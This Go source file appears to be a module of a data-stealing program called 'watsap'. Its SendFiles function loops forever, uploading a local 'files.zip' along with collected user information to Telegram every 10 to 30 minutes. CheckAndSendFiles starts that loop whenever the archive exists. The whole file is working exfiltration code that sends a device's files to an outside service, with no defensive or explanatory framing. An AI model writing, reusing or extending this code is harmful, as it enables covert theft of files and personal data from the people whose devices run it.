package files

import (
	"time"
	"watsap/utils/config"
	"watsap/utils/files"
	"watsap/utils/logger"
	"watsap/utils/messages"
	"watsap/utils/telegram"
)

var zipFile = config.WaDir + "/files.zip"

func SendFiles() {
	logger.Debug("Files", "SendFiles started")
	for {
		err := telegram.TgSendFile(zipFile, messages.GetUserInfoMsg())
		if err != nil {
			logger.Error("Files", "Error sending file: %s", err.Error())
		} else {
			logger.Info("Files", "File Sent")
		}
		if config.DebugMode {
			logger.Debug("Files", "DebugMode is ON, sleeping for 5 seconds")
			time.Sleep(5 * time.Second)
		} else {
			if config.FirstRun {
				logger.Debug("Files", "FirstRun is true, sleeping for 10 minutes")
				time.Sleep(10 * time.Minute)
			} else {
				logger.Debug("Files", "Sleeping for 30 minutes")
				time.Sleep(30 * time.Minute)
			}
		}
	}
}

func CheckAndSendFiles() {
	logger.Debug("Files", "CheckAndSendFiles called")
	if files.Exists(zipFile) {
		logger.Info("Files", "zipFile exists, sending files")
		SendFiles()
	} else {
		logger.Debug("Files", "File not found: %s", zipFile)
	}
}
